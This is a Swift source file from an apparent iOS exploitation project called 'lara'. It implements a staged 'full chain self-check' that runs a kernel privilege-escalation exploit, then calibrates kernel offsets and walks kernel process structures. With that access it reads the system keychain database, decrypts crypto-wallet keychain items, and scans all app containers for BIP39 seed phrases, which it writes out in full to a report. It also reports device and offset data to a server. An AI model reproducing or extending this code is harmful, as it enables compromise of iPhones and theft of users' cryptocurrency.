//
//  SelfCheck.swift
//  lara
//
//  一键全链路自检（2026-11-23）
//
//  按一次按钮，把整条链所有环节跑一遍，最后给一个明确结论。
//
//  阶段：
//    1  环境
//    2  偏移表 / 动态符号
//    3  助记词词表自检
//    4  内核提权
//    5  语义自洽（11 项，验证偏移是否真对）
//    6  进程遍历
//    7  vfsinit
//    8  keychain / genp
//    9  class key 猎取 + SFAC 解密
//   10  助记词识别
//   11  汇总判定
//
//  安全措施：
//    · 每过一个阶段就把进度写进 Documents/fullchain_progress.log
//      万一 kernel panic 重启，下次打开能看到停在第几阶段
//    · 任何一步失败都不中断，继续后面的（能跑多少算多少）
//

import Foundation
import SwiftUI
import Darwin
import UIKit
import Combine

// MARK: - 结果模型

struct CheckItem {
    enum Status: String {
        case pass = "PASS"
        case fail = "FAIL"
        case warn = "WARN"
        case info = "INFO"
        case skip = "SKIP"
    }
    let stage: Int
    let name: String
    let status: Status
    let detail: String
}

final class SelfCheck: ObservableObject {

    static let shared = SelfCheck()

    @Published var items: [CheckItem] = []
    @Published var running = false
    @Published var finished = false
    @Published var verdict: String = ""
    @Published var currentStage: Int = 0
    @Published var stageName: String = ""

    private var mgr: laramgr { laramgr.shared }
    private let progressFile: URL = {
        let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
        return docs.appendingPathComponent("fullchain_progress.log")
    }()

    private var stageOK: [Int: Bool] = [:]
    private var genpRows: [GenpExtractor.Row] = []
    private var decrypted: [(String, Data)] = []

    // MARK: - 记录

    private func add(_ stage: Int, _ name: String, _ st: CheckItem.Status, _ detail: String) {
        let it = CheckItem(stage: stage, name: name, status: st, detail: detail)
        DispatchQueue.main.async { self.items.append(it) }
        mgr.logmsg("[sc\(stage)] \(st.rawValue) \(name): \(detail)")
    }

    private func mark(_ stage: Int, _ name: String, _ note: String = "") {
        let line = String(format: "[%@] stage %d %@ %@\n",
                          ISO8601DateFormatter().string(from: Date()), stage, name, note)
        if let h = try? FileHandle(forWritingTo: progressFile) {
            h.seekToEndOfFile()
            h.write(line.data(using: .utf8) ?? Data())
            try? h.close()
        } else {
            try? line.write(to: progressFile, atomically: true, encoding: .utf8)
        }
        DispatchQueue.main.async {
            self.currentStage = stage
            self.stageName = name
        }
        mgr.logmsg("[sc] -- 阶段 \(stage): \(name) \(note)")
    }

    private func setStage(_ stage: Int, ok: Bool) {
        stageOK[stage] = ok
    }

    // MARK: - 入口

    /// 全链路（含提权）
    func runFullChain() {
        guard !running else { return }
        running = true
        finished = false
        items = []
        verdict = ""
        stageOK = [:]
        genpRows = []
        decrypted = []
        try? FileManager.default.removeItem(at: progressFile)
        mgr.logmsg("[sc] ===== 一键全链路自检开始 =====")

        DispatchQueue.global(qos: .userInitiated).async {
            self.stage1Env()
            self.stage2Offsets()
            self.stage3Wordlist()
            self.stage4Exploit()
            self.stage45Calibrate()
            self.stage5Semantic()
            self.stage6Procs()
            self.stage7Vfs()
            self.stage8Keychain()
            self.stage9Decrypt()
            self.stage10Mnemonic()
            self.stage105Hunt()
            self.stage11Verdict()
        }
    }

    /// 安全模式（不提权）
    func runSafeOnly() {
        guard !running else { return }
        running = true
        finished = false
        items = []
        verdict = ""
        stageOK = [:]
        genpRows = []
        decrypted = []
        try? FileManager.default.removeItem(at: progressFile)
        mgr.logmsg("[sc] ===== 安全自检（不提权）开始 =====")

        DispatchQueue.global(qos: .userInitiated).async {
            self.stage1Env()
            self.stage2Offsets()
            self.stage3Wordlist()
            self.add(4, "内核提权", .skip, "安全模式：跳过")
            self.setStage(4, ok: false)
            self.add(45, "偏移自校准", .skip, "需要提权")
            self.stage5Semantic()
            self.stage6Procs()
            self.add(7, "vfsinit", .skip, "需要提权")
            self.add(8, "keychain", .skip, "需要提权")
            self.add(9, "class key / SFAC", .skip, "需要提权")
            self.add(10, "助记词", .skip, "需要解密结果")
            self.add(105, "内容狩猎", .skip, "需要提权")
            self.stage11Verdict()
        }
    }

    // MARK: - 1 环境

    private func stage1Env() {
        mark(1, "环境")
        let v = UIDevice.current
        add(1, "设备", .info, "\(KeychainDumpManager.sysctlString("hw.machine") ?? "?") / iOS \(v.systemVersion)")
        add(1, "内核基址", .info,
            String(format: "0x%llx  slide 0x%llx", KernelScan.kernelBase, UInt64(ds_get_kernel_slide())))
        add(1, "PAC mask", .info, String(format: "0x%llx", pac_mask))
        add(1, "t1sz_boot", .info, String(format: "0x%llx", t1sz_boot))
        add(1, "已验证范围", .info,
            "iOS 到 \(ShellBootstrap.verifiedMaxMajor).\(ShellBootstrap.verifiedMaxMinor)")
        setStage(1, ok: true)
    }

    // MARK: - 2 偏移表

    private func stage2Offsets() {
        mark(2, "偏移表")
        let offs: [(String, UInt32)] = [
            ("p_proc_ro", off_proc_p_proc_ro), ("p_pid", off_proc_p_pid),
            ("p_fd", off_proc_p_fd), ("p_flag", off_proc_p_flag),
            ("p_textvp", off_proc_p_textvp), ("p_name", off_proc_p_name),
            ("pr_task", off_proc_ro_pr_task), ("p_ucred", off_proc_ro_p_ucred),
            ("fd_ofiles", off_filedesc_fd_ofiles), ("fd_cdir", off_filedesc_fd_cdir),
            ("v_name", off_vnode_v_name), ("v_data", off_vnode_v_data),
            ("t_tro", off_thread_t_tro), ("tro_proc", off_thread_ro_tro_proc),
            ("ctid", off_thread_ctid), ("mutex", off_thread_mutex_lck_mtx_data),
            ("inp_next", off_inpcb_inp_list_le_next),
            ("inp_pcbinfo", off_inpcb_inp_pcbinfo),
            ("inp_socket", off_inpcb_inp_socket),
            ("so_usecount", off_socket_so_usecount),
            ("so_proto", off_socket_so_proto),
        ]
        var zero: [String] = []
        var s: [String] = []
        for (n, val) in offs {
            if val == 0 { zero.append(n) }
            s.append("\(n)=0x\(String(val, radix: 16))")
        }
        add(2, "偏移表 21 项", zero.isEmpty ? .pass : .fail,
            zero.isEmpty ? "全部非 0" : "为 0: \(zero.joined(separator: ","))")
        add(2, "偏移明细", .info, s.joined(separator: " "))

        let keys = ["lara.allprocoff", "lara.kernprocoff", "lara.rootvnodeoff", "lara.kernproc_size"]
        var kv: [String] = []
        var missing = false
        for k in keys {
            if let n = UserDefaults.standard.object(forKey: k) as? NSNumber, n.uint64Value != 0 {
                kv.append(k.replacingOccurrences(of: "lara.", with: "") + "=0x" + String(n.uint64Value, radix: 16))
            } else {
                kv.append(k.replacingOccurrences(of: "lara.", with: "") + "=缺失")
                missing = true
            }
        }
        add(2, "动态符号", missing ? .warn : .pass, kv.joined(separator: " "))
        setStage(2, ok: zero.isEmpty)
    }

    // MARK: - 3 词表

    private func stage3Wordlist() {
        mark(3, "助记词词表")
        let known = "abandon ability able about above absent absorb abstract absurd abuse access accident"
        let h1 = MnemonicDetector.find(in: known)
        add(3, "英文词表", h1.count >= 1 && h1[0].wordCount == 12 ? .pass : .fail,
            h1.isEmpty ? "识别不出来（词表没进包）" : "\(h1.count) 组 \(h1[0].matched)/12")

        let zh = "的 一 是 在 不 了 有 和 人 这 中 大"
        let h2 = MnemonicDetector.find(in: zh)
        add(3, "简中词表", h2.isEmpty ? .warn : .pass, h2.isEmpty ? "没识别" : "\(h2.count) 组")

        let noise = "this is just a normal sentence with some random words nothing special here"
        let h3 = MnemonicDetector.find(in: noise)
        add(3, "误报测试", h3.isEmpty ? .pass : .warn, h3.isEmpty ? "无命中" : "误报 \(h3.count) 组")
        setStage(3, ok: !h1.isEmpty)
    }

    // MARK: - 4 提权

    private var libTier = "内置硬编码"

    private func stage4Exploit() {
        mark(4, "内核提权")

        // ★ 先用三级来源解析偏移：本地缓存 → 服务端库 → 内置硬编码
        let res = OffsetLibrary.shared.resolve()
        libTier = res.tier.rawValue
        add(4, "偏移来源", res.tier == .hardcoded ? .info : .pass,
            "\(res.tier.rawValue)：\(res.detail)")
        if let e = res.entry {
            OffsetLibrary.shared.apply(e)
            add(4, "已应用", .pass, "\(e.offsets.count) 项，置信度 \(e.confidence)")
        }

        if mgr.dsready {
            add(4, "内核提权", .pass, "已就绪")
            setStage(4, ok: true)
            return
        }
        if !ShellBootstrap.offsetsVerified() && !ShellBootstrap.userOverrideUnverified {
            add(4, "内核提权", .fail,
                "iOS \(UIDevice.current.systemVersion) 偏移未真机验证，需在界面确认")
            setStage(4, ok: false)
            return
        }
        mark(4, "内核提权", "运行 darksword")
        var ok = false
        let sem = DispatchSemaphore(value: 0)
        mgr.run { r in ok = r; sem.signal() }
        _ = sem.wait(timeout: .now() + 180)
        add(4, "内核提权", ok ? .pass : .fail, ok ? "darksword 成功" : "失败或超时")
        setStage(4, ok: ok)
        mark(4, "内核提权", ok ? "OK" : "FAIL")
    }

    // MARK: - 4.5 偏移自校准（核心升级）

    private var calibrated: CalibratedOffsets?

    private func stage45Calibrate() {
        mark(45, "偏移自校准")
        guard mgr.dsready else {
            add(45, "偏移自校准", .skip, "需要先提权")
            setStage(45, ok: false)
            return
        }
        let r = OffsetCalibrator.calibrate()
        calibrated = r

        // 逐条把校准结果打出来
        for line in r.log {
            add(45, "校准", .info, line)
        }

        // 与硬编码值对比结论
        var mismatched: [String] = []
        if let v = r.p_proc_ro, v != off_proc_p_proc_ro { mismatched.append("p_proc_ro") }
        if let v = r.p_pid, v != off_proc_p_pid { mismatched.append("p_pid") }
        if let v = r.p_fd, v != off_proc_p_fd { mismatched.append("p_fd") }
        if let v = r.p_textvp, v != off_proc_p_textvp { mismatched.append("p_textvp") }
        if let v = r.pr_task, v != off_proc_ro_pr_task { mismatched.append("pr_task") }
        if let v = r.t_tro, v != off_thread_t_tro { mismatched.append("t_tro") }

        if mismatched.isEmpty {
            add(45, "硬编码偏移", .pass, "校准值与 offsets.m 完全一致，这个版本的偏移是对的")
        } else {
            add(45, "硬编码偏移", .warn,
                "★不一致的字段: \(mismatched.joined(separator: ",")) —— 已用校准值覆盖")
            OffsetCalibrator.apply(r)
            add(45, "已覆盖", .pass, r.summary())
        }

        add(45, "校准完整度",
            r.full ? .pass : (r.enough ? .warn : .fail),
            r.full ? "关键字段全中（含 vnode/fd/thread）"
                   : (r.enough ? "基础字段够用，vnode/fd/thread 未全中"
                               : "基础字段都不够，后面的写操作有风险"))
        // ★ 自校准拿不到基础字段时，上深度扫描（全进程表交叉验证）
        if !r.enough {
            add(45, "转深度扫描", .warn, "自校准不足，用全进程表交叉验证重新定位")
            let deep = OffsetDeepScanner.scan(full: true)
            for line in deep.log { add(45, "深度扫描", .info, line) }
            for c in deep.candidates.prefix(6) {
                add(45, "候选 \(c.field)", .info,
                    String(format: "0x%x 得分 %.2f（%@）", c.offset, c.score, c.note))
            }
            if deep.complete {
                OffsetDeepScanner.apply(deep)
                add(45, "深度扫描", .pass, "拿到 \(deep.summary())")
                OffsetLibrary.shared.promoteFromCalibration(r)
            } else {
                add(45, "深度扫描", .fail, "仍然没扫出来（\(deep.procCount) 个进程）")
            }
        }

        setStage(45, ok: r.enough)
        mark(45, "偏移自校准", r.enough ? "OK" : "FAIL")
    }

    // MARK: - 5 语义自洽

    private func stage5Semantic() {
        mark(5, "语义自洽")
        let proc = UInt64(ds_get_our_proc())
        guard proc != 0 else {
            add(5, "语义自洽", .fail, "没有 our_proc（需要先提权）")
            setStage(5, ok: false)
            return
        }
        var pass = 0
        var total = 0
        func chk(_ n: String, _ ok: Bool, _ det: String, _ important: Bool = true) {
            total += 1
            if ok { pass += 1 }
            add(5, n, ok ? .pass : (important ? .fail : .warn), det)
        }

        let pid = KernelScan.rd32(proc + UInt64(off_proc_p_pid))
        chk("p_pid == getpid()", pid == UInt32(getpid()), "读出 \(pid) / 实际 \(getpid())")

        var name = ""
        if off_proc_p_name != 0, let d = KernelScan.read(proc + UInt64(off_proc_p_name), 32) {
            name = String(decoding: d.prefix(while: { $0 != 0 }), as: UTF8.self)
        }
        chk("p_name", name == "Liebao", "\"\(name)\"")

        let procRo = KernelScan.rd64(proc + UInt64(off_proc_p_proc_ro))
        chk("p_proc_ro", procRo > KernelScan.kernelBase, String(format: "0x%llx", procRo))

        let task = KernelScan.rd64(procRo + UInt64(off_proc_ro_pr_task))
        let realTask = UInt64(ds_get_our_task())
        chk("pr_task == our_task", task == realTask, String(format: "0x%llx / 0x%llx", task, realTask))

        let textvp = KernelScan.rd64(proc + UInt64(off_proc_p_textvp))
        chk("p_textvp", textvp > KernelScan.kernelBase, String(format: "0x%llx", textvp))
        if textvp != 0, let d = KernelScan.read(textvp + UInt64(off_vnode_v_name), 64) {
            let vn = String(decoding: d.prefix(while: { $0 != 0 && $0 >= 0x20 && $0 < 0x7F }), as: UTF8.self)
            chk("p_textvp->v_name", vn == "Liebao", "\"\(vn)\"")
        }

        let fd = KernelScan.rd64(proc + UInt64(off_proc_p_fd))
        chk("p_fd", fd > KernelScan.kernelBase, String(format: "0x%llx", fd))
        if fd != 0 {
            let ofiles = KernelScan.rd64(fd + UInt64(off_filedesc_fd_ofiles))
            chk("fd_ofiles", ofiles > KernelScan.kernelBase, String(format: "0x%llx", ofiles))
            let cdir = KernelScan.rd64(fd + UInt64(off_filedesc_fd_cdir))
            if cdir != 0, let d = KernelScan.read(cdir + UInt64(off_vnode_v_name), 64) {
                let cn = String(decoding: d.prefix(while: { $0 != 0 && $0 >= 0x20 && $0 < 0x7F }), as: UTF8.self)
                chk("fd_cdir->v_name", cn == "/", "\"\(cn)\" 期望 /")
            }
        }

        let tq = KernelScan.rd64(realTask + UInt64(off_task_threads_next))
        chk("task_threads_next", tq > KernelScan.kernelBase, String(format: "0x%llx", tq), false)
        if tq != 0 {
            let th = KernelScan.rd64(tq)
            let ctid = KernelScan.rd32(th + UInt64(off_thread_ctid))
            chk("thread.ctid", ctid < 100000, "\(ctid)", false)
            let tro = KernelScan.rd64(th + UInt64(off_thread_t_tro))
            chk("thread.t_tro", tro > KernelScan.kernelBase, String(format: "0x%llx", tro), false)
            if tro > KernelScan.kernelBase && off_thread_ro_tro_proc != 0 {
                let tp = KernelScan.rd64(tro + UInt64(off_thread_ro_tro_proc))
                chk("tro_proc == our_proc", tp == proc, String(format: "0x%llx / 0x%llx", tp, proc), false)
            }
        }

        let ucred = KernelScan.rd64(procRo + UInt64(off_proc_ro_p_ucred))
        chk("p_ucred", ucred > KernelScan.kernelBase, String(format: "0x%llx", ucred))
        if ucred != 0 {
            let label = KernelScan.rd64(ucred + UInt64(off_ucred_cr_label))
            chk("cr_label", label > KernelScan.kernelBase, String(format: "0x%llx", label), false)
        }

        if off_socket_so_usecount != 0 {
            let pcb = UInt64(ds_get_rw_socket_pcb())
            chk("rw_socket pcb", pcb > KernelScan.kernelBase, String(format: "0x%llx", pcb))
            if pcb != 0 {
                let so = KernelScan.rd64(pcb + UInt64(off_inpcb_inp_socket))
                chk("inp_socket", so > KernelScan.kernelBase, String(format: "0x%llx", so))
                if so != 0 {
                    let uc = KernelScan.rd32(so + UInt64(off_socket_so_usecount))
                    chk("so_usecount", uc > 0 && uc < 100000, "\(uc)", false)
                }
            }
        }

        add(5, "语义汇总", pass >= total - 2 ? .pass : .fail, "\(pass)/\(total)")
        setStage(5, ok: pass >= total - 2)
    }

    // MARK: - 6 进程

    private func stage6Procs() {
        mark(6, "进程遍历")
        let head = KernelScan.allprocAddress()
        add(6, "allproc 地址", head > KernelScan.kernelBase ? .pass : .fail, String(format: "0x%llx", head))
        guard head != 0 else { setStage(6, ok: false); return }

        let all = KernelScan.allProcs()
        add(6, "进程数", all.count > 10 && all.count < 2000 ? .pass : .fail, "\(all.count)")
        if !all.isEmpty {
            add(6, "进程样本", .info, all.prefix(10).map { "\($0.pid):\($0.name)" }.joined(separator: " "))
        }
        var found = 0
        for t in ["securityd", "trustd", "keybagd"] {
            if let pi = all.first(where: { $0.name == t }) {
                add(6, "找到 " + t, .pass, "pid=\(pi.pid)")
                found += 1
            } else {
                add(6, "找到 " + t, .warn, "不在列表")
            }
        }
        setStage(6, ok: all.count > 10 && found >= 1)
    }

    // MARK: - 7 vfs

    private func stage7Vfs() {
        mark(7, "文件访问")

        // ★ 先探测双后端：内核 vfs（需提权）或沙盒逃逸 worse_query（iOS 26/27 可用）
        let be = FileAccess.probe()
        add(7, "后端", be == .none ? .fail : .pass, FileAccess.describe())
        add(7, "系统版本", .info, SandboxEscape.versionHint())
        if be == .sandbox {
            add(7, "沙盒逃逸", .pass, "worse_query 在这台设备上可用（无需越狱/内核漏洞）")
            setStage(7, ok: true)
            mark(7, "沙盒逃逸", "OK")
            return
        }
        if be == .none {
            add(7, "两条后端都不可用", .fail, FileAccess.probeDetail)
            setStage(7, ok: false)
            return
        }

        mark(7, "vfsinit")
        if mgr.vfsready {
            add(7, "vfsinit", .pass, "已就绪")
            setStage(7, ok: true)
            return
        }
        guard mgr.dsready else {
            add(7, "vfsinit", .fail, "需要先提权")
            setStage(7, ok: false)
            return
        }
        var ok = false
        let sem = DispatchSemaphore(value: 0)
        mgr.vfsinit { r in ok = r; sem.signal() }
        _ = sem.wait(timeout: .now() + 90)
        add(7, "vfsinit", ok ? .pass : .fail, ok ? "vfs 可用" : "失败或超时")
        setStage(7, ok: ok)
        mark(7, "vfsinit", ok ? "OK" : "FAIL")
    }

    // MARK: - 8 keychain

    private func stage8Keychain() {
        mark(8, "keychain / genp")
        guard let db = mgr.vfsread(path: "/private/var/Keychains/keychain-2.db",
                                   maxSize: 200 * 1024 * 1024) else {
            add(8, "读 keychain-2.db", .fail, "vfsread 失败")
            setStage(8, ok: false)
            return
        }
        add(8, "读 keychain-2.db", .pass, "\(db.count) B")

        let tmp = NSTemporaryDirectory() + "sc_kc.db"
        try? db.write(to: URL(fileURLWithPath: tmp))
        genpRows = GenpExtractor.extract(dbPath: tmp)
        try? FileManager.default.removeItem(atPath: tmp)
        add(8, "genp 提取", genpRows.isEmpty ? .fail : .pass, "\(genpRows.count) 行")

        let wallet = genpRows.filter { r in
            let a = r.agrp.lowercased()
            return GenpExtractor.walletAgrpPatterns.contains { a.contains($0) }
        }
        add(8, "钱包 genp", wallet.isEmpty ? .warn : .pass,
            wallet.isEmpty ? "本机没装那 14 个钱包" : "\(wallet.count) 行")
        setStage(8, ok: !genpRows.isEmpty)
        mark(8, "keychain", "genp=\(genpRows.count) wallet=\(wallet.count)")
    }

    // MARK: - 9 class key / SFAC

    private func stage9Decrypt() {
        mark(9, "class key / SFAC")
        let wallet = genpRows.filter { r in
            let a = r.agrp.lowercased()
            return GenpExtractor.walletAgrpPatterns.contains { a.contains($0) }
        }
        guard let first = wallet.first else {
            add(9, "class key", .skip, "没有钱包样本")
            add(9, "SFAC 解密", .skip, "同上")
            setStage(9, ok: false)
            return
        }
        guard let sac = SFACParser.parse(first.data) else {
            add(9, "SFAC 结构", .fail, "rowid=\(first.rowid) 解析失败")
            setStage(9, ok: false)
            return
        }
        add(9, "SFAC 样本", .info,
            "rowid=\(first.rowid) iv=\(sac.iv.count)B ct=\(sac.ciphertext.count)B tag=\(sac.authCode.count)B")

        mark(9, "class key", "开始扫描")
        let t0 = Date()
        if let key = ClassKeyHunter.hunt(sac: sac, hint: first.agrp) {
            let ms = Int(Date().timeIntervalSince(t0) * 1000)
            add(9, "class key", .pass,
                "找到 \(key.count)B \(key.prefix(8).map { String(format: "%02x", $0) }.joined())... \(ms)ms")
            if let pt = AESCTR.decrypt(key: key, iv: sac.iv, ciphertext: sac.ciphertext) {
                let head = String(decoding: pt.prefix(40), as: UTF8.self)
                    .replacingOccurrences(of: "\n", with: " ")
                add(9, "SFAC 解密", .pass, "\(pt.count) B 头40: \(head)")
                decrypted.append(("rowid=\(first.rowid) \(first.agrp)", pt))
                for r in wallet.dropFirst().prefix(8) {
                    let it = GPItem(rowid: r.rowid, agrp: r.agrp, acct: r.acct,
                                    svce: r.svce, rawData: r.data,
                                    sac: SFACParser.parse(r.data))
                    if let p = SFACDecryptor.decrypt(item: it) {
                        decrypted.append(("rowid=\(r.rowid) \(r.agrp)", p))
                    }
                }
                add(9, "批量解密", decrypted.count > 1 ? .pass : .info, "共 \(decrypted.count) 条")
                setStage(9, ok: true)
            } else {
                add(9, "SFAC 解密", .fail, "有 key 但解不出来")
                setStage(9, ok: false)
            }
        } else {
            let ms = Int(Date().timeIntervalSince(t0) * 1000)
            add(9, "class key", .fail, "全部进程都没找到 \(ms)ms")
            setStage(9, ok: false)
        }
        mark(9, "class key", stageOK[9] == true ? "OK" : "FAIL")
    }

    // MARK: - 10 助记词

    private func stage10Mnemonic() {
        mark(10, "助记词识别")
        guard !decrypted.isEmpty else {
            add(10, "助记词", .skip, "没有解密结果")
            setStage(10, ok: false)
            return
        }
        var total = 0
        for (tag, d) in decrypted {
            for h in MnemonicDetector.find(in: d) {
                total += 1
                add(10, "命中 " + h.lang, .pass,
                    "\(h.wordCount)词 \(h.matched)/\(h.wordCount) src=\(tag)")
                add(10, "助记词内容", .info, h.words.joined(separator: " "))
            }
        }
        if total == 0 {
            add(10, "助记词", .warn, "解出 \(decrypted.count) 条但没有 BIP39 助记词")
        }
        setStage(10, ok: total > 0)
    }

    // MARK: - 10.5 内容狩猎（全容器，不靠名单）

    private var huntHits: [HuntHit] = []

    private func stage105Hunt() {
        mark(105, "内容狩猎")
        guard mgr.vfsready else {
            add(105, "内容狩猎", .skip, "vfs 未就绪")
            setStage(105, ok: false)
            return
        }

        add(105, "钱包知识库", .info, "已覆盖 \(WalletDB.count) 个钱包（国内 \(WalletDB.cn.count) / 国际 \(WalletDB.intl.count)）")

        mark(105, "内容狩猎", "开始扫全容器")
        let (hits, st) = MnemonicHunter.shared.hunt(deep: true)
        huntHits = hits

        add(105, "扫描规模", .info,
            "容器 \(st.containers) · 轮次 \(st.rounds) · 文件 \(st.filesRead) · \(st.bytesRead / 1024) KB · \(st.elapsedMs) ms")

        let mn = hits.filter { $0.kind == "mnemonic" }
        let keys = hits.filter { $0.kind != "mnemonic" }

        if mn.isEmpty {
            add(105, "助记词（内容识别）", .warn, "全盘没扫到 BIP39 助记词")
        } else {
            add(105, "助记词（内容识别）", .pass, "★ 命中 \(mn.count) 条")
            for h in mn.prefix(20) {
                add(105, "\(h.lang) \(h.wordCount)词", .pass,
                    "\(h.walletName) / \(h.bundleId)")
                add(105, "内容", .info, h.preview)
                add(105, "位置", .info, h.path)
            }
        }

        if !keys.isEmpty {
            add(105, "其它密钥材料", .pass, "\(keys.count) 条")
            for h in keys.prefix(10) {
                add(105, h.kind, .info, "\(h.walletName): \(h.preview.prefix(60))")
            }
        }

        setStage(105, ok: !mn.isEmpty)
        mark(105, "内容狩猎", mn.isEmpty ? "无" : "\(mn.count)条")
    }

    // MARK: - 11 汇总

    private func stage11Verdict() {
        mark(11, "汇总")
        let names: [Int: String] = [
            1: "环境", 2: "偏移表", 3: "词表", 4: "内核提权", 45: "偏移自校准", 5: "语义自洽",
            6: "进程遍历", 7: "vfs", 8: "keychain", 9: "class key/SFAC", 10: "助记词", 105: "内容狩猎",
        ]
        var lines: [String] = []
        var passCount = 0, failCount = 0, skipCount = 0
        for s in [1,2,3,4,45,5,6,7,8,9,10,105] {
            let ok = stageOK[s]
            let hasSkip = items.contains { $0.stage == s && $0.status == .skip }
            let mk: String
            if ok == true { mk = "[OK]"; passCount += 1 }
            else if hasSkip { mk = "[--]"; skipCount += 1 }
            else { mk = "[!!]"; failCount += 1 }
            let nm = names[s] ?? ("阶段" + String(s))
            lines.append(mk + " " + String(s) + ". " + nm)
            add(11, "阶段" + String(s) + " " + nm,
                ok == true ? .pass : (hasSkip ? .skip : .fail), mk)
        }
        var v = ""
        if passCount >= 12 { v = "全链路已打通 (12/12)" }
        else if passCount >= 10 { v = "主体打通 " + String(passCount) + "/12，缺口 " + String(failCount) }
        else if passCount >= 6 { v = "部分打通 " + String(passCount) + "/12" }
        else { v = "未打通 " + String(passCount) + "/12" }
        add(11, "结论", passCount >= 10 ? .pass : .fail, v)
        DispatchQueue.main.async { self.verdict = lines.joined(separator: "\n") + "\n\n" + v }

        dump()
        DispatchQueue.main.async {
            self.running = false
            self.finished = true
        }
        // ★ 回流：把这一轮的来源/校准/扫描结果打包上报，让库越用越准
        let cal = calibrated
        var calDict: [String: UInt32] = [:]
        if let c = cal {
            func put(_ n: String, _ x: UInt32?) { if let x { calDict[n] = x } }
            put("p_proc_ro", c.p_proc_ro); put("p_pid", c.p_pid); put("p_name", c.p_name)
            put("p_fd", c.p_fd); put("p_textvp", c.p_textvp); put("pr_task", c.pr_task)
            put("t_tro", c.t_tro); put("tro_proc", c.tro_proc)
            put("ctid", c.ctid); put("mutex", c.mutex)
        }
        let hard = OffsetLibrary.shared.currentHardcoded()
        var mismatch: [String] = []
        for (k, v) in calDict { if let h = hard[k], h != v { mismatch.append(k) } }
        let okAll = passCount >= 9
        OffsetLibrary.shared.report(
            ios: UIDevice.current.systemVersion,
            cpu: OffsetLibrary.cpuFamilyName(),
            build: OffsetLibrary.osBuild(),
            tier: libTier,
            used: hard,
            calibrated: calDict,
            mismatched: mismatch,
            stageReached: currentStage,
            ok: okAll,
            scanLog: lastProgress() + "\n---\n" + OffsetDeepScanner.lastProgress())
        add(11, "上报偏移库", .info,
            "key=\(OffsetLibrary.shared.currentKey()) 校准\(calDict.count)项 不一致\(mismatch.count)项")

        // 校准结果提升为本地缓存，下次启动直接命中
        if let c = cal, c.enough {
            OffsetLibrary.shared.promoteFromCalibration(c)
            add(11, "本地缓存", .pass, "已缓存，下次启动无需再扫")
        }

        mgr.logmsg("[sc] ===== 全链路自检结束: \(v) =====")
        mark(11, "结束", v)
    }

    // MARK: - 报告

    func reportText() -> String {
        var s = ""
        s += "IOS2 全链路自检报告\n"
        s += "时间: \(ISO8601DateFormatter().string(from: Date()))\n"
        s += "设备: \(KeychainDumpManager.sysctlString("hw.machine") ?? "?")  iOS \(UIDevice.current.systemVersion)\n"
        s += String(format: "内核: 0x%llx  slide 0x%llx\n\n",
                    KernelScan.kernelBase, UInt64(ds_get_kernel_slide()))
        var stage = -1
        for it in items.sorted(by: { $0.stage < $1.stage }) {
            if it.stage != stage {
                stage = it.stage
                s += "\n-- 阶段 \(it.stage) --\n"
            }
            s += "[\(it.status.rawValue)] \(it.name)\n        \(it.detail)\n"
        }
        if !huntHits.isEmpty {
            s += "\n==== 内容狩猎明细 ====\n"
            for h in huntHits {
                s += "[\(h.kind)] \(h.lang) \(h.wordCount)词 \(h.walletName)/\(h.bundleId)\n"
                s += "  \(h.preview)\n  \(h.path)\n"
            }
        }
        if !verdict.isEmpty {
            s += "\n==== 结论 ====\n\(verdict)\n"
        }
        return s
    }

    func lastProgress() -> String {
        (try? String(contentsOf: progressFile, encoding: .utf8)) ?? "(没有进度记录)"
    }

    private func dump() {
        let txt = reportText()
        let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
        let f = docs.appendingPathComponent("fullchain_\(Int(Date().timeIntervalSince1970)).txt")
        try? txt.write(to: f, atomically: true, encoding: .utf8)
        mgr.logmsg("[sc] 报告已存 \(f.lastPathComponent)")
    }
}
